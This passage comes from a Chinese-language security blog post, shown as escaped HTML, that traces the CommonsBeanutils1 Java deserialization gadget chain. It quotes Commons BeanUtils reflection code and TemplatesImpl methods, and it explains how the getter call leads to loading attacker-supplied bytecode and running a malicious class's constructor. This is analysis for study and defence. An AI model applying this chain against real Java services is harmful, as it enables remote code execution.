&lt;span style="color:#66d9ef">return&lt;/span> PropertyUtilsBean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getInstance&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Object bean&lt;span style="color:#f92672">,&lt;/span> String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IllegalAccessException&lt;span style="color:#f92672">,&lt;/span> InvocationTargetException&lt;span style="color:#f92672">,&lt;/span> NoSuchMethodException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getNestedProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">getNestedProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Object bean&lt;span style="color:#f92672">,&lt;/span> String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IllegalAccessException&lt;span style="color:#f92672">,&lt;/span> InvocationTargetException&lt;span style="color:#f92672">,&lt;/span> NoSuchMethodException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>bean &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;No bean specified&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;No name specified for bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">resolver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hasNested&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
String next &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">resolver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">next&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">);&lt;/span>
Object nestedBean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>bean &lt;span style="color:#66d9ef">instanceof&lt;/span> Map&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
nestedBean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getPropertyOfMapBean&lt;/span>&lt;span style="color:#f92672">((&lt;/span>Map&lt;span style="color:#f92672">)&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> next&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">resolver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isMapped&lt;/span>&lt;span style="color:#f92672">(&lt;/span>next&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
nestedBean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMappedProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> next&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">resolver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isIndexed&lt;/span>&lt;span style="color:#f92672">(&lt;/span>next&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
nestedBean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getIndexedProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> next&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
nestedBean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getSimpleProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> next&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>nestedBean &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NestedNullException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Null property value for &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
bean &lt;span style="color:#f92672">=&lt;/span> nestedBean&lt;span style="color:#f92672">;&lt;/span>
name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">resolver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>bean &lt;span style="color:#66d9ef">instanceof&lt;/span> Map&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
bean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getPropertyOfMapBean&lt;/span>&lt;span style="color:#f92672">((&lt;/span>Map&lt;span style="color:#f92672">)&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">resolver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isMapped&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
bean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMappedProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">resolver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isIndexed&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
bean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getIndexedProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
bean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getSimpleProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> bean&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>getSimpleProperty&lt;/code>方法内会通过反射获取到&lt;code>TemplatesImpl&lt;/code>对象&lt;code>property&lt;/code>对应的的getter方法并调用，在java规范中outputProperities对应的getter方法名应该为getOutputProperities&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">getSimpleProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Object bean&lt;span style="color:#f92672">,&lt;/span> String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IllegalAccessException&lt;span style="color:#f92672">,&lt;/span> InvocationTargetException&lt;span style="color:#f92672">,&lt;/span> NoSuchMethodException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>bean &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;No bean specified&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;No name specified for bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">resolver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hasNested&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Nested property names are not allowed: Property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">resolver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isIndexed&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Indexed property names are not allowed: Property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">resolver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isMapped&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Mapped property names are not allowed: Property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>bean &lt;span style="color:#66d9ef">instanceof&lt;/span> DynaBean&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
DynaProperty descriptor &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>DynaBean&lt;span style="color:#f92672">)&lt;/span>bean&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">getDynaClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getDynaProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>descriptor &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NoSuchMethodException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Unknown property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on dynaclass &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">((&lt;/span>DynaBean&lt;span style="color:#f92672">)&lt;/span>bean&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">getDynaClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">((&lt;/span>DynaBean&lt;span style="color:#f92672">)&lt;/span>bean&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
PropertyDescriptor descriptor &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getPropertyDescriptor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>bean&lt;span style="color:#f92672">,&lt;/span> name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>descriptor &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NoSuchMethodException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Unknown property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Method readMethod &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getReadMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>bean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> descriptor&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>readMethod &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NoSuchMethodException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; has no getter method in class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Object value &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">invokeMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>readMethod&lt;span style="color:#f92672">,&lt;/span> bean&lt;span style="color:#f92672">,&lt;/span> EMPTY_OBJECT_ARRAY&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> value&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/5.png" />&lt;/p>
&lt;p>&lt;code>TemplatesImpl&lt;/code>类中&lt;code>getOutputProperties&lt;/code>方法代码如下，会调用&lt;code>newTransformer&lt;/code>方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> Properties &lt;span style="color:#a6e22e">getOutputProperties&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> newTransformer&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getOutputProperties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>TransformerConfigurationException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> Transformer &lt;span style="color:#a6e22e">newTransformer&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> TransformerConfigurationException
&lt;span style="color:#f92672">{&lt;/span>
TransformerImpl transformer&lt;span style="color:#f92672">;&lt;/span>
transformer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerImpl&lt;span style="color:#f92672">(&lt;/span>getTransletInstance&lt;span style="color:#f92672">(),&lt;/span> _outputProperties&lt;span style="color:#f92672">,&lt;/span>
_indentNumber&lt;span style="color:#f92672">,&lt;/span> _tfactory&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>_uriResolver &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
transformer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setURIResolver&lt;/span>&lt;span style="color:#f92672">(&lt;/span>_uriResolver&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>_tfactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getFeature&lt;/span>&lt;span style="color:#f92672">(&lt;/span>XMLConstants&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">FEATURE_SECURE_PROCESSING&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
transformer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setSecureProcessing&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> transformer&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>newTransformer会调用getTransletInstance方法，在该方法内会调用defineTransletClasses方法，defineTransletClasses会读取_bytecodes并通过defineClass方法通过字节码加载成对应的类并构造对应的对象，所以这个过程会执行恶意类的构造方法。&lt;/p>
